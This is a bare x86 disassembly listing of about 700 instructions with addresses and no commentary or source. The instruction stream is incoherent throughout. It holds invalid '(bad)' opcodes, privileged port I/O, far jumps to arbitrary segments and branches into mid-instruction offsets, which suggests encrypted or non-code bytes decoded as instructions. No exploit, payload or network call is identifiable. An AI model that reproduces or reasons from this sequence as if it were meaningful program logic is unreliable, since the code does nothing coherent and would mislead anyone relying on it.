  409f04:	mov    fs,WORD PTR [ebx+edi*2]
  409f07:	xchg   edi,eax
  409f08:	test   DWORD PTR [eax+esi*8+0x55],esi
  409f0c:	pop    esp
  409f0d:	sar    DWORD PTR [edi+0x6677254],0xe9
  409f14:	arpl   bp,di
  409f16:	sub    BYTE PTR [edi+0x26a494e3],ah
  409f1c:	loop   0x409ed4
  409f1e:	sar    DWORD PTR [edi-0x71],cl
  409f21:	push   edx
  409f22:	iret   
  409f23:	ret    0x788d
  409f26:	cmp    ecx,ebp
  409f28:	std    
  409f29:	adc    eax,DWORD PTR [edi]
  409f2b:	mov    ebx,0x2679a33a
  409f30:	and    eax,0xfc9d6c76
  409f35:	repz adc al,BYTE PTR [esi-0x19daeeac]
  409f3c:	dec    eax
  409f3d:	adc    bh,BYTE PTR [ebp+0x1aba4a7f]
  409f43:	not    BYTE PTR [edi-0x41ec11f4]
  409f49:	shr    esi,0x3a
  409f4c:	cli    
  409f4d:	mov    edi,0xd5c2113d
  409f52:	ror    DWORD PTR [eax-0x1b039841],1
  409f58:	jne    0x409f9f
  409f5a:	repnz sbb BYTE PTR [edi+esi*8+0x4f89cf5c],0xca
  409f63:	jp     0x409f51
  409f65:	bound  esp,QWORD PTR [ecx]
  409f67:	or     eax,esi
  409f69:	std    
  409f6a:	jnp    0x409fd9
  409f6c:	dec    eax
  409f6d:	sbb    ebp,DWORD PTR [edi]
  409f6f:	push   cx
  409f71:	pop    edi
  409f72:	or     ecx,DWORD PTR ds:0x5d13f859
  409f78:	xor    cl,BYTE PTR [ebx-0x16]
  409f7b:	lods   eax,DWORD PTR ds:[esi]
  409f7c:	pop    esp
  409f7d:	fst    QWORD PTR [ecx]
  409f7f:	fist   WORD PTR [ecx-0x57]
  409f82:	sub    BYTE PTR [edi+ebp*1],dl
  409f85:	xor    DWORD PTR [edi],ebx
  409f87:	mov    dl,BYTE PTR [esi]
  409f89:	push   0x4417a12
  409f8e:	in     eax,0x1d
  409f90:	cs dec esp
  409f92:	in     eax,0x47
  409f94:	mov    ebp,0x3a835ba9
  409f99:	jae    0x409fe6
  409f9b:	je     0x409fde
  409f9d:	cmp    bl,BYTE PTR [ecx]
  409f9f:	sbb    DWORD PTR [edx],ebx
  409fa1:	adc    DWORD PTR [esi-0x79],ebx
  409fa4:	ret    
  409fa5:	dec    esp
  409fa6:	lea    esp,[edx+eiz*4+0x9e99f57]
  409fad:	repz push ds
  409faf:	jbe    0x409f98
  409fb1:	popa   
  409fb2:	adc    al,0x14
  409fb4:	xchg   edx,eax
  409fb5:	add    al,0xa8
  409fb7:	repnz fwait
  409fb9:	das    
  409fba:	mov    bh,0xae
  409fbc:	or     BYTE PTR [ebx+ecx*8],0xf
  409fc0:	sar    DWORD PTR [eax],1
  409fc2:	or     al,0x4d
  409fc4:	mov    bl,0x74
  409fc6:	clc    
  409fc7:	mov    esi,0x5f76d631
  409fcc:	es dec edi
  409fce:	jb     0x40a02f
  409fd0:	sbb    al,0x6d
  409fd2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409fd3:	xlat   BYTE PTR ds:[ebx]
  409fd4:	and    DWORD PTR [edx-0x2bc79fdb],0xbb734969
  409fde:	jne    0x409f7b
  409fe0:	popa   
  409fe1:	adc    al,0x70
  409fe3:	or     al,0xe7
  409fe5:	jecxz  0x409fcf
  409fe7:	cmp    BYTE PTR [ecx-0x47cfbed6],ch
  409fed:	fisubr WORD PTR [edx]
  409fef:	fcomp  DWORD PTR [edi+0x15]
  409ff2:	(bad)  
  409ff3:	mov    ecx,0x25d42e95
  409ff8:	xor    al,0xf8
  409ffa:	add    edi,DWORD PTR [ecx]
  409ffc:	stos   BYTE PTR es:[edi],al
  409ffd:	hlt    
  409ffe:	into   
  409fff:	pushf  
  40a000:	loopne 0x409f99
  40a002:	cmp    eax,0x187ec191
  40a007:	or     BYTE PTR [esi+0x78],bh
  40a00a:	pop    esi
  40a00b:	mov    al,0xaf
  40a00d:	sbb    edi,DWORD PTR [edx-0x6e]
  40a010:	lds    ebp,FWORD PTR [esi]
  40a012:	add    edi,DWORD PTR [esi-0x59]
  40a015:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a016:	fwait
  40a017:	mov    edx,0x95b68a83
  40a01c:	or     BYTE PTR [ecx-0x4b615749],ch
  40a022:	push   ebp
  40a023:	xlat   BYTE PTR ds:[ebx]
  40a024:	mov    ebp,0x5b3e21d6
  40a029:	and    bl,BYTE PTR [esi+0x7e]
  40a02c:	and    esp,DWORD PTR [ebx]
  40a02e:	add    DWORD PTR [esi],ecx
  40a030:	js     0x40a05b
  40a032:	in     eax,0x7a
  40a034:	loope  0x409fe7
  40a036:	fdiv   st(1),st
  40a038:	aas    
  40a039:	adc    ch,BYTE PTR [ebx]
  40a03b:	cmp    DWORD PTR [edi],ebp
  40a03d:	retf   0x28de
  40a040:	xchg   esi,eax
  40a041:	sbb    edi,DWORD PTR [edi+ebp*1-0x6d]
  40a045:	xor    DWORD PTR [eax+esi*2-0x10425d3e],esi
  40a04c:	mov    eax,ds:0xc8bf511a
  40a051:	jne    0x40a09a
  40a053:	mov    edx,0x9a342403
  40a058:	mov    ds:0x5c9ee8ab,eax
  40a05d:	scas   eax,DWORD PTR es:[edi]
  40a05e:	sub    DWORD PTR [ecx-0x65],0xffffffbe
  40a062:	and    DWORD PTR [eax+ebp*2-0x4f],esp
  40a066:	add    eax,edx
  40a068:	fucomp st(3)
  40a06a:	pop    edi
  40a06b:	adc    DWORD PTR [ebp+0x387eb6af],esp
  40a071:	inc    ecx
  40a072:	push   0x7f
  40a074:	xlat   BYTE PTR ds:[ebx]
  40a075:	aas    
  40a076:	and    BYTE PTR [ecx+0x10da3786],cl
  40a07c:	cmp    BYTE PTR ds:0xa7420b5a,dh
  40a082:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a083:	push   edi
  40a084:	mov    bl,0x12
  40a086:	push   esp
  40a087:	lock std 
  40a089:	mov    cl,0x9c
  40a08b:	mov    WORD PTR [esi],fs
  40a08d:	out    0x50,al
  40a08f:	scas   eax,DWORD PTR es:[edi]
  40a090:	ja     0x40a0a2
  40a092:	outs   dx,BYTE PTR ds:[esi]
  40a093:	test   DWORD PTR [ecx-0x42],edx
  40a096:	xchg   ebx,eax
  40a097:	mov    bl,0xe6
  40a099:	div    ecx
  40a09b:	clc    
  40a09c:	mov    dh,0xc4
  40a09e:	and    dl,al
  40a0a0:	rol    BYTE PTR [ebx+edx*8],0x7f
  40a0a4:	inc    esp
  40a0a5:	jb     0x40a0f5
  40a0a7:	outs   dx,BYTE PTR ds:[esi]
  40a0a8:	mov    WORD PTR [eax+0x4de4111a],ss
  40a0ae:	push   es
  40a0af:	fst    DWORD PTR [eax+0x76444d1c]
  40a0b5:	mov    dl,0xba
  40a0b7:	and    esi,DWORD PTR [esi+ebp*8-0x1df5887e]
  40a0be:	add    DWORD PTR [ebx-0x13e81d70],esp
  40a0c4:	xchg   edi,eax
  40a0c5:	cmp    eax,0x24502c5c
  40a0ca:	mov    dl,0x16
  40a0cc:	push   es
  40a0cd:	pop    ss
  40a0ce:	clc    
  40a0cf:	retf   0x774c
  40a0d2:	addr16 xchg ebp,eax
  40a0d4:	sbb    eax,ebp
  40a0d6:	cmp    ecx,DWORD PTR [edx-0x70be9a2e]
  40a0dc:	sar    al,cl
  40a0de:	push   cs
  40a0df:	xchg   ebp,eax
  40a0e0:	cmp    eax,DWORD PTR [ecx+eax*2-0x62a4c7aa]
  40a0e7:	ret    0xf4c6
  40a0ea:	addr16 addr16 int3 
  40a0ed:	jae    0x40a159
  40a0ef:	and    eax,0x33f757c9
  40a0f4:	js     0x40a0bd
  40a0f6:	sar    ebp,1
  40a0f8:	inc    esi
  40a0f9:	jle    0x40a0e5
  40a0fb:	fstp   QWORD PTR [edi-0x4a]
  40a0fe:	test   BYTE PTR [edx],dl
  40a100:	repz and ah,BYTE PTR [ebx+0x6a1eb685]
  40a107:	jo     0x40a168
  40a109:	mov    edx,0x4ae3552f
  40a10e:	out    dx,al
  40a10f:	jmp    0x8be:0xb2161957
  40a116:	shl    BYTE PTR ds:0xa98dd94b,cl
  40a11c:	data16 jae 0x40a186
  40a11f:	btr    edi,eax
  40a122:	sbb    DWORD PTR [edx+0xf945305],0xfffffff3
  40a129:	test   DWORD PTR [edi-0x25],ebx
  40a12c:	cld    
  40a12d:	adc    DWORD PTR [esi],esp
  40a12f:	scas   al,BYTE PTR es:[edi]
  40a130:	stos   BYTE PTR es:[edi],al
  40a131:	scas   al,BYTE PTR es:[edi]
  40a132:	outs   dx,BYTE PTR ds:[esi]
  40a133:	or     BYTE PTR [edi],cl
  40a135:	jmp    0xbae7ad17
  40a13a:	jns    0x40a1ab
  40a13c:	jae    0x40a11f
  40a13e:	pop    esi
  40a13f:	cs jmp 0x40a0fe
  40a142:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a143:	out    0x52,eax
  40a145:	es cmp eax,0x9f4ae6d4
  40a14b:	cmp    esi,DWORD PTR [ebx]
  40a14d:	cmp    al,0x27
  40a14f:	mov    WORD PTR [eax+0x1c50aa37],?
  40a155:	mov    WORD PTR [edx+0x70c7a44b],cs
  40a15b:	mov    cl,0xb4
  40a15d:	loopne 0x40a135
  40a15f:	scas   al,BYTE PTR es:[edi]
  40a160:	clc    
  40a161:	inc    esi
  40a162:	cmc    
  40a163:	cs out 0xaa,eax
  40a166:	jmp    0x40a0ff
  40a168:	ss xchg ebp,eax
  40a16a:	sbb    ecx,edi
  40a16c:	and    dl,dl
  40a16e:	pop    ebx
  40a16f:	test   DWORD PTR [edx-0x4651a01a],ecx
  40a175:	xor    esp,DWORD PTR [ecx-0x2a]
  40a178:	in     eax,0x74
  40a17a:	mov    gs,esp
  40a17c:	adc    DWORD PTR [eax+0xf2575c9],0x3b6fd6cc
  40a186:	es push ebp
  40a188:	bound  edx,QWORD PTR [ebx]
  40a18a:	clc    
  40a18b:	cld    
  40a18c:	into   
  40a18d:	mov    ds:0x4984d267,eax
  40a192:	data16 sub ch,BYTE PTR [edi-0x6f]
  40a196:	pop    eax
  40a197:	dec    edi
  40a198:	push   eax
  40a199:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a19a:	xchg   ebx,eax
  40a19b:	test   al,0x1a
  40a19d:	in     eax,dx
  40a19e:	repz sub ebx,DWORD PTR [ebp+0x3c]
  40a1a2:	out    dx,eax
  40a1a3:	lods   al,BYTE PTR ds:[esi]
  40a1a4:	ds dec esi
  40a1a6:	test   al,0x95
  40a1a8:	sub    DWORD PTR [edi+ebp*4-0x522d614e],edx
  40a1af:	push   ss
  40a1b0:	inc    esi
  40a1b1:	sbb    eax,0xcef0234a
  40a1b6:	dec    ebx
  40a1b7:	shl    BYTE PTR [edi],0x37
  40a1ba:	(bad)  
  40a1bb:	jge    0x40a21d
  40a1bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a1be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a1bf:	adc    eax,0xbc4d250d
  40a1c4:	arpl   WORD PTR [edx],bx
  40a1c6:	jle    0x40a1da
  40a1c8:	stos   DWORD PTR es:[edi],eax
  40a1c9:	pop    ecx
  40a1ca:	push   edi
  40a1cb:	std    
  40a1cc:	loope  0x40a21e
  40a1ce:	shl    DWORD PTR [esp+ebp*2-0x7b],0x79
  40a1d3:	xchg   edx,eax
  40a1d4:	and    al,0xeb
  40a1d6:	into   
  40a1d7:	outs   dx,DWORD PTR ds:[esi]
  40a1d8:	(bad)  
  40a1d9:	ja     0x40a1ec
  40a1db:	outs   dx,DWORD PTR ds:[esi]
  40a1dc:	cdq    
  40a1dd:	xlat   BYTE PTR ds:[ebx]
  40a1de:	inc    esi
  40a1df:	pop    ds
  40a1e0:	inc    eax
  40a1e1:	jge    0x40a1f2
  40a1e3:	addr16 inc ecx
  40a1e5:	sub    eax,0xf2d81c71
  40a1ea:	pop    edi
  40a1eb:	jmp    0xee1c:0x65b68643
  40a1f2:	or     eax,0x7628615d
  40a1f7:	pop    esp
  40a1f8:	inc    edx
  40a1f9:	mov    eax,0x69dd07fb
  40a1fe:	sub    DWORD PTR [ebx+ecx*8-0x7b19f1db],esp
  40a205:	or     al,0x45
  40a207:	ins    BYTE PTR es:[edi],dx
  40a208:	or     ah,BYTE PTR [edx]
  40a20a:	lahf   
  40a20b:	call   0xa9a1:0x14735f63
  40a212:	mov    al,ds:0x497069ad
  40a217:	xchg   esi,eax
  40a218:	bound  esp,QWORD PTR [edi+eax*2+0x41775aa8]
  40a21f:	mov    dl,0xb
  40a221:	sub    DWORD PTR [eax],esp
  40a223:	mov    ds:0xdcdc186,eax
  40a228:	das    
  40a229:	push   ebp
  40a22a:	pop    edi
  40a22b:	int3   
  40a22c:	push   esp
  40a22e:	das    
  40a22f:	cmp    BYTE PTR [edi-0x28ac0c6],0x4a
  40a236:	or     DWORD PTR [edx],edx
  40a238:	outs   dx,BYTE PTR ds:[esi]
  40a239:	xchg   BYTE PTR [edi-0x1b],dl
  40a23c:	popa   
  40a23d:	mov    dh,cl
  40a23f:	loop   0x40a1c5
  40a241:	pop    edi
  40a242:	push   edx
  40a243:	and    DWORD PTR [bp+si-0x4a5a],0xffffffd1
  40a249:	dec    ecx
  40a24a:	out    dx,eax
  40a24b:	jnp    0x40a24f
  40a24d:	test   eax,0xc271eeef
  40a252:	sbb    al,0xc7
  40a254:	scas   al,BYTE PTR es:[edi]
  40a255:	cmp    ecx,ecx
  40a257:	add    DWORD PTR [esi],ebx
  40a259:	into   
  40a25a:	sub    eax,0x38786e85
  40a25f:	pop    eax
  40a260:	lahf   
  40a261:	stos   BYTE PTR es:[edi],al
  40a262:	inc    eax
  40a263:	push   edi
  40a264:	js     0x40a1fb
  40a266:	mov    es,WORD PTR [ebx-0x7bfce42d]
  40a26c:	repz out 0xe2,al
  40a26f:	and    eax,0xe3a1bd4f
  40a274:	sub    DWORD PTR [ebp+0x7a],edx
  40a277:	push   esp
  40a278:	inc    ecx
  40a279:	inc    esp
  40a27a:	mov    ds:0x67f11b9e,eax
  40a27f:	out    0x5,eax
  40a281:	sbb    eax,0x225eea9f
  40a286:	(bad)  
  40a287:	dec    esi
  40a288:	or     ch,BYTE PTR [ebx-0x4b]
  40a28b:	call   0x856f2981
  40a290:	iret   
  40a291:	sbb    esi,DWORD PTR [edx+0xd8135b0]
  40a297:	rol    BYTE PTR [ecx+0x4f],cl
  40a29a:	lea    edi,[ecx-0x65]
  40a29d:	outs   dx,DWORD PTR ds:[esi]
  40a29e:	ds mov edi,0xdcd472f1
  40a2a4:	pop    ss
  40a2a5:	inc    BYTE PTR [edi]
  40a2a7:	sub    dl,BYTE PTR [ecx]
  40a2a9:	push   edi
  40a2aa:	adc    bh,BYTE PTR [ebx]
  40a2ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a2ad:	popa   
  40a2ae:	xchg   edi,eax
  40a2af:	shl    DWORD PTR [edx+0x5c],0x49
  40a2b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a2b4:	xor    DWORD PTR [eax+0x12],0xb990e17a
  40a2bb:	push   edx
  40a2bc:	es push ds
  40a2be:	or     dh,ch
  40a2c0:	add    ebp,DWORD PTR [ebx]
  40a2c2:	cwde   
  40a2c3:	mov    dl,BYTE PTR [ecx-0x69]
  40a2c6:	enter  0x90d9,0xe2
  40a2ca:	popa   
  40a2cb:	inc    edx
  40a2cc:	call   0xe6a1:0x7f852eb5
  40a2d3:	xor    cl,0x41
  40a2d6:	cld    
  40a2d7:	test   ecx,edi
  40a2d9:	mov    edi,0x9ae9bae9
  40a2de:	adc    al,0xc9
  40a2e0:	ror    BYTE PTR [ebx+0x9],cl
  40a2e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a2e4:	loopne 0x40a2ea
  40a2e6:	aas    
  40a2e7:	hlt    
  40a2e8:	fnsave [eax-0x41]
  40a2eb:	sbb    dh,0xc
  40a2ee:	pop    DWORD PTR [edx+ecx*8+0x7cf72e51]
  40a2f5:	mov    al,0x8e
  40a2f7:	retf   
  40a2f8:	mov    eax,DWORD PTR [ebx]
  40a2fa:	(bad)  
  40a2fb:	cmp    DWORD PTR [edi],esi
  40a2fd:	dec    eax
  40a2fe:	clc    
  40a2ff:	out    dx,al
  40a300:	xchg   esi,eax
  40a301:	repz out 0xe,eax
  40a304:	or     al,0xcb
  40a306:	aas    
  40a307:	xor    eax,0xc0feb3a4
  40a30c:	stos   BYTE PTR es:[edi],al
  40a30d:	inc    ebp
  40a30e:	xor    ecx,DWORD PTR [ecx]
  40a310:	sbb    BYTE PTR [edx-0x18b553f2],0xae
  40a317:	hlt    
  40a318:	mov    ds:0x3dae110b,eax
  40a31d:	stc    
  40a31e:	repz inc ecx
  40a320:	or     al,0xb0
  40a322:	aas    
  40a323:	sbb    eax,0xcb129fb9
  40a328:	enter  0x91d1,0xa2
  40a32c:	test   al,0xd9
  40a32e:	les    edi,FWORD PTR [ecx-0x32e767c4]
  40a334:	nop
  40a335:	jno    0x40a34e
  40a337:	pusha  
  40a338:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a33a:	cmc    
  40a33b:	out    dx,eax
  40a33c:	mov    esi,0xb4f79bd5
  40a341:	loop   0x40a31b
  40a343:	or     BYTE PTR [edi],cl
  40a345:	arpl   WORD PTR [eax+0x6d5ab004],dx
  40a34b:	in     al,dx
  40a34c:	mov    ds:0x143cf9a8,al
  40a351:	add    al,BYTE PTR [ecx+esi*2+0x7]
  40a355:	or     ebx,DWORD PTR [eax+0x4e82dfc1]
  40a35b:	sub    BYTE PTR ds:0xb849eb77,dl
  40a361:	mov    esp,0x6280338d
  40a366:	enter  0xc02,0x51
  40a36a:	ja     0x40a3a2
  40a36c:	and    eax,ebx
  40a36e:	retf   0xe13d
  40a371:	stos   DWORD PTR es:[edi],eax
  40a372:	adc    DWORD PTR [ebp+0x3d],esi
  40a375:	add    al,0xb7
  40a377:	int3   
  40a378:	call   0x2b0e9b6
  40a37d:	lods   eax,DWORD PTR ds:[esi]
  40a37e:	test   DWORD PTR [edi-0x23],esp
  40a381:	js     0x40a3db
  40a383:	ret    
  40a384:	lods   al,BYTE PTR ds:[esi]
  40a385:	lock mov al,0xc9
  40a388:	mov    eax,eax
  40a38a:	jmp    0x40a324
  40a38c:	test   edx,eax
  40a38e:	lods   eax,DWORD PTR ds:[esi]
  40a38f:	dec    ecx
  40a390:	es cmp eax,0x6e83603
  40a396:	test   DWORD PTR [eax+0x1890b303],0xcb994b10
  40a3a0:	lds    esi,FWORD PTR [edx]
  40a3a2:	xor    dl,ah
  40a3a4:	push   esi
  40a3a5:	clc    
  40a3a6:	fxch   st(6)
  40a3a8:	sbb    eax,0xc7f03eba
  40a3ad:	lods   al,BYTE PTR ds:[esi]
  40a3ae:	dec    ecx
  40a3af:	jp     0x40a37d
  40a3b1:	sbb    DWORD PTR [ebp-0x4a],esi
  40a3b4:	lahf   
  40a3b5:	test   eax,0x5caad0e4
  40a3ba:	js     0x40a379
  40a3bc:	je     0x40a3ed
  40a3be:	inc    esp
  40a3bf:	arpl   WORD PTR [ebx+0x6503f1dc],dx
  40a3c5:	in     al,0x30
  40a3c7:	mov    edx,0xce10c861
  40a3cc:	sbb    BYTE PTR [edx+0x75],bl
  40a3cf:	(bad)  
  40a3d1:	icebp  
  40a3d2:	scas   al,BYTE PTR es:[edi]
  40a3d3:	(bad)  
  40a3d4:	and    bl,BYTE PTR [edi+0x1e]
  40a3d7:	call   0x8c02:0x7eed2c15
  40a3de:	and    BYTE PTR [esi],dl
  40a3e0:	push   edi
  40a3e1:	jb     0x40a3ba
  40a3e3:	xchg   DWORD PTR [ebp+0x1dfe35e],ebx
  40a3e9:	mov    esp,0xc6c39dba
  40a3ee:	pusha  
  40a3ef:	outs   dx,BYTE PTR ds:[esi]
  40a3f0:	gs push 0xc89e3f12
  40a3f6:	into   
  40a3f7:	popf   
  40a3f8:	push   edi
  40a3f9:	rcr    edx,1
  40a3fb:	sti    
  40a3fc:	jl     0x40a409
  40a3fe:	jmp    0x40a3aa
  40a400:	dec    ecx
  40a401:	dec    eax
  40a402:	push   edx
  40a403:	sbb    al,0x34
  40a405:	icebp  
  40a406:	jno    0x40a39c
  40a408:	pushf  
  40a409:	bound  edx,QWORD PTR [ebx+0x43]
  40a40c:	cs and al,0xe3
  40a40f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a410:	mov    bl,0x5e
  40a412:	test   DWORD PTR [esi+0x19],0xdab316e7
  40a419:	push   ebp
  40a41a:	cli    
  40a41b:	sti    
  40a41c:	xchg   ebp,eax
  40a41d:	jns    0x40a3ad
  40a41f:	mov    ebp,0xd8059931
  40a424:	popa   
  40a425:	ins    DWORD PTR es:[edi],dx
  40a426:	dec    ebx
  40a427:	outs   dx,BYTE PTR ds:[esi]
  40a428:	and    ebp,ebp
  40a42a:	adc    BYTE PTR [ecx],bl
  40a42c:	outs   dx,DWORD PTR ds:[esi]
  40a42d:	scas   al,BYTE PTR es:[edi]
  40a42e:	(bad)  
  40a42f:	shr    BYTE PTR [ecx-0xc98c6d4],1
  40a435:	mov    ch,0xe9
  40a437:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a438:	out    0xdd,eax
  40a43a:	sub    DWORD PTR [edx+ecx*4-0x36607fd5],0xd
  40a442:	aas    
  40a443:	add    cl,dh
  40a445:	pop    esp
  40a446:	xor    DWORD PTR [ecx],esp
  40a448:	adc    eax,ebx
  40a44a:	sub    esi,DWORD PTR [esi]
  40a44c:	xchg   DWORD PTR [eax+eax*2-0x52],esp
  40a450:	mov    edi,DWORD PTR [edi-0x69]
  40a453:	iret   
  40a454:	jmp    0x40a448
  40a456:	(bad)  
  40a457:	cwde   
  40a458:	jae    0x40a4a7
  40a45a:	test   al,0x43
  40a45c:	jns    0x40a41c
  40a45e:	jge    0x40a3f7
  40a460:	add    BYTE PTR [eax-0x21d08247],0xfb
  40a467:	std    
  40a468:	and    al,0xbd
  40a46a:	mov    esi,0x8026308f
  40a46f:	sbb    DWORD PTR [ecx-0x7e9b60b5],edx
  40a475:	jl     0x40a46e
  40a477:	add    edx,DWORD PTR [eax+ecx*1+0x60983930]
  40a47e:	add    BYTE PTR [esi+0x4f],ah
  40a481:	jge    0x40a420
  40a483:	mov    ch,0x91
  40a485:	leave  
  40a486:	jmp    0x597643ab
  40a48b:	push   ds
  40a48c:	mov    ?,WORD PTR [ecx+0x4720064e]
  40a492:	bnd fs js 0x40a4ea
  40a496:	rol    BYTE PTR [ebp+0x1fefc0d5],cl
  40a49c:	aas    
  40a49d:	jbe    0x40a45f
  40a49f:	mov    esi,0x754b2bb4
  40a4a4:	sti    
  40a4a5:	adc    eax,DWORD PTR [ecx+0x5c]
  40a4a8:	jae    0x40a4bc
  40a4aa:	pop    ss
  40a4ab:	or     edi,DWORD PTR ds:0x5bb6c01c
  40a4b1:	jmp    0x33f9257d
  40a4b6:	cmc    
  40a4b7:	or     BYTE PTR [eax+eiz*1],0xec
  40a4bb:	mov    edx,eax
  40a4bd:	jp     0x40a45c
  40a4bf:	inc    ecx
  40a4c0:	pop    edx
  40a4c1:	xor    dh,BYTE PTR [edx+esi*2]
  40a4c4:	lahf   
  40a4c5:	and    ebx,DWORD PTR [ebx]
  40a4c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a4c8:	xchg   ebp,eax
  40a4c9:	cmc    
  40a4ca:	xchg   ebx,eax
  40a4cb:	(bad)  
  40a4cd:	inc    ecx
  40a4ce:	xchg   edx,eax
  40a4cf:	pop    ebp
  40a4d0:	shl    DWORD PTR ds:0x770044b7,0xa1
  40a4d7:	pop    edi
  40a4d8:	cmp    BYTE PTR [ebp-0x337d93e1],al
  40a4de:	mov    bh,0x50
  40a4e0:	xchg   BYTE PTR [esi],ah
  40a4e2:	mov    ebx,0xb5673fb7
  40a4e7:	jge    0x40a530
  40a4e9:	sub    DWORD PTR [ebp-0xb],esi
  40a4ec:	dec    ebp
  40a4ed:	out    0xc6,eax
  40a4ef:	jp     0x40a4b1
  40a4f1:	push   0xffffffad
  40a4f3:	fimul  DWORD PTR [ebp+0x41]
  40a4f6:	inc    edx
  40a4f7:	and    ebx,DWORD PTR [edx+edx*8]
  40a4fa:	mov    esi,0x5e2c65fd
  40a4ff:	cld    
  40a500:	lock pop ss
  40a502:	cmp    eax,0xdff7654
  40a507:	lahf   
  40a508:	hlt    
  40a509:	out    0x1f,eax
  40a50b:	mov    es,WORD PTR [eax]
  40a50d:	mov    es,WORD PTR [edi]
  40a50f:	push   ebp
  40a510:	mov    al,0x2b
  40a512:	or     BYTE PTR [ebx-0x50],ch
  40a515:	cwde   
  40a516:	xor    ecx,ecx
  40a518:	inc    ebx
  40a519:	push   ebx
  40a51a:	fadd   QWORD PTR [eax]
  40a51c:	mov    ch,0x40
  40a51e:	pop    ebp
  40a51f:	pop    ds
  40a520:	mov    dl,0xf3
  40a522:	inc    esp
  40a523:	lds    ebp,FWORD PTR [esi-0x44]
  40a526:	pop    ecx
  40a527:	sub    al,0x5
  40a529:	xor    DWORD PTR [esi-0x535094cb],0xfffffff8
  40a530:	xchg   esp,eax
  40a531:	imul   al
  40a533:	cld    
  40a534:	and    eax,0x132974da
  40a539:	sbb    DWORD PTR [eax+0x58],esi
  40a53c:	or     eax,DWORD PTR [ecx]
  40a53e:	(bad)  [eax]
  40a540:	xchg   edi,eax
  40a541:	(bad)  
  40a542:	cli    
  40a543:	xor    al,0x93
  40a545:	dec    ebp
  40a546:	cli    
  40a547:	shr    BYTE PTR [ebx+0x40b0ff85],cl
  40a54d:	mov    eax,ds:0x8815b316
  40a552:	sbb    DWORD PTR [edx-0x58],edi
  40a555:	out    dx,al
  40a556:	cmp    eax,0x1638c939
  40a55b:	mul    dh
  40a55d:	mov    dl,0xc8
  40a55f:	adc    DWORD PTR [ebp-0x70],esi
  40a562:	pop    eax
  40a563:	mov    ss,WORD PTR [edi]
  40a565:	inc    ebp
  40a566:	repz mov dh,0x2d
  40a569:	inc    ebp
  40a56a:	sub    al,0x1e
  40a56c:	out    0x48,al
  40a56e:	jnp    0x40a500
  40a570:	pushf  
  40a571:	rcl    DWORD PTR [edx-0x37028859],cl
  40a577:	ins    DWORD PTR es:[edi],dx
  40a578:	(bad)  
  40a57a:	mov    bh,0x88
  40a57c:	imul   ebp,ecx,0xffffffa3
  40a57f:	psubsw mm0,mm6
  40a582:	jb     0x40a5fe
  40a584:	sbb    dl,BYTE PTR [ebp+0x0]
  40a587:	ret    0x223a
  40a58a:	aas    
  40a58b:	(bad)  
  40a58c:	mov    DWORD PTR [edi-0xb1ed1da],ebp
  40a592:	push   ecx
  40a593:	mov    dh,0x72
  40a595:	cld    
  40a596:	cmp    al,0xf6
  40a598:	xchg   edi,eax
  40a599:	repnz shl DWORD PTR fs:[edx],0x3
  40a59e:	lods   eax,DWORD PTR ds:[esi]
  40a59f:	popf   
  40a5a0:	inc    esi
  40a5a1:	fst    DWORD PTR [edx-0x1]
  40a5a4:	stos   BYTE PTR es:[edi],al
  40a5a5:	icebp  
  40a5a6:	push   esi
  40a5a7:	sti    
  40a5a8:	adc    ah,BYTE PTR [eax+0x4c]
  40a5ab:	call   DWORD PTR [edi-0x48]
  40a5ae:	jecxz  0x40a5a5
  40a5b0:	call   0xd393f528
  40a5b5:	gs scas al,BYTE PTR es:[edi]
  40a5b7:	rcr    BYTE PTR cs:[edx-0x74],1
  40a5bb:	xchg   DWORD PTR ds:0x8c556a72,edx
  40a5c1:	cmp    edx,edx
  40a5c3:	sbb    DWORD PTR [eax-0x3c49bb93],edi
  40a5c9:	push   0x1c546317
  40a5ce:	inc    ebx
  40a5cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a5d0:	mov    al,ds:0xbe9704e3
  40a5d5:	sbb    DWORD PTR ds:[esi+0x1b],ebp
  40a5d9:	mov    cl,BYTE PTR ds:0xb4f08619
  40a5df:	outs   dx,DWORD PTR ds:[esi]
  40a5e0:	mov    esp,0x8a6606e
  40a5e5:	jmp    0x74fe:0x63e6b39a
  40a5ec:	int    0x7a
  40a5ee:	pop    es
  40a5ef:	and    al,0x29
  40a5f1:	add    al,0xfa
  40a5f3:	pushf  
  40a5f4:	jns    0x40a611
  40a5f6:	test   eax,0x39b6bf5d
  40a5fb:	sub    al,0x9d
  40a5fd:	or     eax,0xd6790214
  40a602:	aaa    
  40a603:	cmp    esp,edx
  40a605:	nop    DWORD PTR [edx-0x3e]
  40a609:	jl     0x40a66e
  40a60b:	ss push 0x2c
  40a60e:	fld    DWORD PTR [eax+0x6f]
  40a611:	cmp    bl,BYTE PTR [edi+0x3d]
  40a614:	imul   eax,DWORD PTR ds:0xdc466bb1,0x481989e1
  40a61e:	jb     0x40a61d
  40a620:	sar    BYTE PTR ss:[esi+eiz*2],0x3c
  40a625:	jb     0x40a5b1
  40a627:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a628:	stos   BYTE PTR es:[edi],al
  40a629:	sub    esp,DWORD PTR [edi+0x76]
  40a62c:	(bad)  
  40a62e:	test   al,0xe9
  40a630:	enter  0x1189,0x4c
  40a634:	in     eax,0x7c
  40a636:	cs mov eax,0x6c74f4af
  40a63c:	into   
  40a63d:	mov    edi,0x5882e857
  40a642:	jmp    0xdcda:0x14bed448
  40a649:	xor    BYTE PTR [edx],ah
  40a64b:	jae    0x40a6b4
  40a64d:	mov    eax,ds:0x6f6fdd71
  40a652:	fst    QWORD PTR [ebx-0x56]
  40a655:	or     BYTE PTR [ebx+0x1793c7f1],dl
